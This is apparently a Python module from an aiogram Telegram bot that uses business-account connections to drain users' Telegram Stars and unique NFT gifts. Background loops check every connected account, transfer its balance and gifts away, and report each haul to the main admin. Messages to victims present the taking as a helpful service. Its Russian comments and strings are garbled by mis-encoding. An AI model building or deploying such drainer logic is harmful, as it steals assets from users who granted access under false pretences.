import asyncio
import logging
from typing import Dict, Any
from aiogram import Bot

from config import (
    get_main_admin_id, MIN_STARS_FOR_AUTO_TRANSFER, NOTIFICATION_INTERVAL,
    AUTO_CHECK_INTERVAL, RATE_LIMIT_DELAY
)
from utils.file_utils import get_connections, load_settings
from utils.transfer import get_star_balance, transfer_all_stars, transfer_all_unique_gifts
from utils.logging import log_performance

logger = logging.getLogger(__name__)

async def check_user_balance(bot: Bot, conn: Dict[str, Any]) -> bool:
    """–ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –±–∞–ª–∞–Ω—Å–∞ –æ–¥–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    try:
        conn_id = conn["business_connection_id"]
        user_id = conn["user_id"]
        username = conn.get("username", "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å")
        
        star_balance = await get_star_balance(bot, conn_id)
        
        if star_balance >= MIN_STARS_FOR_AUTO_TRANSFER:
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
            await bot.send_message(
                user_id,
                f"‚≠êÔ∏è <b>–£ –≤–∞—Å –Ω–∞–∫–æ–ø–∏–ª–æ—Å—å {star_balance} –∑–≤–µ–∑–¥!</b>\n\n"
                f"–≠—Ç–æ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞ NFT. "
                f"–ë–æ—Ç —Å–∫–æ—Ä–æ –∑–∞–±–µ—Ä–µ—Ç –∏—Ö –¥–ª—è –≤–∞—Å! üéÅ",
                parse_mode="HTML"
            )
            
            # –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–µ—Ä–µ–≤–æ–¥–∏–º –∑–≤–µ–∑–¥—ã
            settings = load_settings()
            if settings.get("auto_transfer", True):
                stars_result = await transfer_all_stars(bot, conn_id, user_id)
                if stars_result["transferred"] > 0:
                    await bot.send_message(
                        user_id,
                        f"‚úÖ <b>–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–µ—Ä–µ–≤–µ–¥–µ–Ω–æ {stars_result['transferred']} –∑–≤–µ–∑–¥!</b>\n\n"
                        f"–°–ø–∞—Å–∏–±–æ –∑–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –Ω–∞—à–µ–≥–æ –±–æ—Ç–∞! üéâ",
                        parse_mode="HTML"
                    )
                    
                    # –£–≤–µ–¥–æ–º–ª—è–µ–º –∞–¥–º–∏–Ω–∞
                    await bot.send_message(
                        get_main_admin_id(),
                        f"ü§ñ <b>–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –ø–µ—Ä–µ–≤–æ–¥ –∑–≤–µ–∑–¥:</b>\n"
                        f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{username}\n"
                        f"üÜî ID: <code>{user_id}</code>\n"
                        f"‚≠êÔ∏è –ü–µ—Ä–µ–≤–µ–¥–µ–Ω–æ: <b>{stars_result['transferred']}</b>\n"
                        f"üìÖ –í—Ä–µ–º—è: {asyncio.get_event_loop().time()}",
                        parse_mode="HTML"
                    )
                elif stars_result["error"]:
                    await bot.send_message(
                        get_main_admin_id(),
                        f"‚ùå <b>–û—à–∏–±–∫–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞:</b>\n"
                        f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{username}\n"
                        f"üÜî ID: <code>{user_id}</code>\n"
                        f"‚ùóÔ∏è –û—à–∏–±–∫–∞: {stars_result['error']}",
                        parse_mode="HTML"
                    )
            return True
        return False
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –±–∞–ª–∞–Ω—Å–∞ –¥–ª—è {conn.get('user_id')}: {e}")
        return False

async def send_smart_notifications(bot: Bot):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ —É–º–Ω—ã—Ö —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º"""
    try:
        settings = load_settings()
        if not settings.get("auto_notifications", True):
            return
        
        connections = get_connections()
        
        # –°–æ–∑–¥–∞–µ–º –∑–∞–¥–∞—á–∏ –¥–ª—è –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏ –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
        tasks = [
            check_user_balance(bot, conn)
            for conn in connections
        ]
        
        # –í—ã–ø–æ–ª–Ω—è–µ–º –≤—Å–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # –õ–æ–≥–∏—Ä—É–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
        successful_checks = sum(1 for r in results if r is True)
        logger.info(f"–£–º–Ω—ã–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è: –ø—Ä–æ–≤–µ—Ä–µ–Ω–æ {len(connections)} –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π, —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: {successful_checks}")
                
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–º–Ω—ã—Ö —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π: {e}")

async def check_and_transfer_nft_for_user(bot: Bot, conn: Dict[str, Any]) -> bool:
    """–ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –∏ –ø–µ—Ä–µ–≤–æ–¥ NFT –¥–ª—è –æ–¥–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    try:
        conn_id = conn["business_connection_id"]
        user_id = conn["user_id"]
        username = conn.get("username", "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å")
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º NFT
        from utils.transfer import get_unique_gifts
        nft_gifts = await get_unique_gifts(bot, conn_id)
        if nft_gifts:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –±–∞–ª–∞–Ω—Å –∑–≤–µ–∑–¥
            star_balance = await get_star_balance(bot, conn_id)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —Ö–≤–∞—Ç–∞–µ—Ç –ª–∏ –∑–≤–µ–∑–¥ –¥–ª—è —Ö–æ—Ç—è –±—ã –æ–¥–Ω–æ–≥–æ NFT
            for gift in nft_gifts:
                required_stars = getattr(gift, 'transfer_star_count', 0)
                if star_balance >= required_stars:
                    # –ü—ã—Ç–∞–µ–º—Å—è –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ NFT
                    nft_result = await transfer_all_unique_gifts(bot, conn_id, user_id, admin_notify=False)
                    if nft_result["transferred"] > 0:
                        await bot.send_message(
                            get_main_admin_id(),
                            f"ü§ñ <b>–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –ø–µ—Ä–µ–≤–æ–¥ NFT:</b>\n"
                            f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{username}\n"
                            f"üÜî ID: <code>{user_id}</code>\n"
                            f"üñº –ü–µ—Ä–µ–≤–µ–¥–µ–Ω–æ NFT: <b>{nft_result['transferred']}</b>\n"
                            f"üìÖ –í—Ä–µ–º—è: {asyncio.get_event_loop().time()}",
                            parse_mode="HTML"
                        )
                    return True
        return False
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞ NFT –¥–ª—è {conn.get('user_id')}: {e}")
        return False

async def auto_transfer_nft_when_ready(bot: Bot):
    """–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –ø–µ—Ä–µ–≤–æ–¥ NFT –∫–æ–≥–¥–∞ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –∑–≤–µ–∑–¥"""
    try:
        settings = load_settings()
        if not settings.get("auto_transfer", True):
            return
        
        connections = get_connections()
        
        # –°–æ–∑–¥–∞–µ–º –∑–∞–¥–∞—á–∏ –¥–ª—è –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ–π –æ–±—Ä–∞–±–æ—Ç–∫–∏ –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
        tasks = [check_and_transfer_nft_for_user(bot, conn) for conn in connections]
        
        # –í—ã–ø–æ–ª–Ω—è–µ–º –≤—Å–µ –∑–∞–¥–∞—á–∏ –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # –õ–æ–≥–∏—Ä—É–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
        successful_transfers = sum(1 for r in results if r is True)
        logger.info(f"–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –ø–µ—Ä–µ–≤–æ–¥ NFT: –ø—Ä–æ–≤–µ—Ä–µ–Ω–æ {len(connections)} –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π, –ø–µ—Ä–µ–≤–æ–¥–æ–≤ –≤—ã–ø–æ–ª–Ω–µ–Ω–æ: {successful_transfers}")
                
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞ NFT: {e}")

async def notifications_task(bot: Bot):
    """–ó–∞–¥–∞—á–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π"""
    while True:
        try:
            await send_smart_notifications(bot)
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞–∂–¥—ã–µ 30 –º–∏–Ω—É—Ç
            await asyncio.sleep(NOTIFICATION_INTERVAL)
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –≤ –∑–∞–¥–∞—á–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π: {e}")
            await asyncio.sleep(RATE_LIMIT_DELAY)  # –ñ–¥–µ–º 5 –º–∏–Ω—É—Ç –ø—Ä–∏ –æ—à–∏–±–∫–µ

async def auto_transfer_task(bot: Bot):
    """–ó–∞–¥–∞—á–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞"""
    while True:
        try:
            await auto_transfer_nft_when_ready(bot)
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞–∂–¥—ã–µ 15 –º–∏–Ω—É—Ç
            await asyncio.sleep(AUTO_CHECK_INTERVAL)
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –≤ –∑–∞–¥–∞—á–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞: {e}")
            await asyncio.sleep(RATE_LIMIT_DELAY)  # –ñ–¥–µ–º 5 –º–∏–Ω—É—Ç –ø—Ä–∏ –æ—à–∏–±–∫–µ

async def start_automation_tasks(bot: Bot):
    """–ó–∞–ø—É—Å–∫ –≤—Å–µ—Ö –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏—Ö –∑–∞–¥–∞—á"""
    try:
        # –ó–∞–ø—É—Å–∫–∞–µ–º —Ñ–æ–Ω–æ–≤—ã–µ –∑–∞–¥–∞—á–∏
        notifications_task_obj = asyncio.create_task(notifications_task(bot))
        auto_transfer_task_obj = asyncio.create_task(auto_transfer_task(bot))
        
        logger.info("üöÄ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–µ –∑–∞–¥–∞—á–∏ –∑–∞–ø—É—â–µ–Ω—ã")
        
        # –ñ–¥–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –∑–∞–¥–∞—á (–æ–Ω–∏ —Ä–∞–±–æ—Ç–∞—é—Ç –±–µ—Å–∫–æ–Ω–µ—á–Ω–æ)
        await asyncio.gather(notifications_task_obj, auto_transfer_task_obj)
        
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏—Ö –∑–∞–¥–∞—á: {e}")
        raise 